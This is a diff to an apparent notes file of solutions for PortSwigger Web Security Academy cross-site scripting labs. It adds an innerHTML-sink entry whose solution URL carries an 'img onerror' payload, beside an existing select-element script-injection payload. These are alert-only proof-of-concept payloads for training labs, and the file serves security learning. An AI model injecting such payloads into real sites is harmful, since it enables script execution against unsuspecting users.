@@ -33,3 +33,7 @@ solution: https://ac201fe61f531f8b80827001006b00a2.web-security-academy.net/?sea
 url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
 solution: https://ac251f101e03062d80f81c48003000e2.web-security-academy.net/product?productId=3&storeId=</option><script>alert(1);</script><option>"
 
+[lab: DOM XSS in innerHTML sink using source location.search]
+url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
+solution: https://aca61f131f35b7d780f25af80025008f.web-security-academy.net/?search=<img src=18 onerror=alert(18)>
+
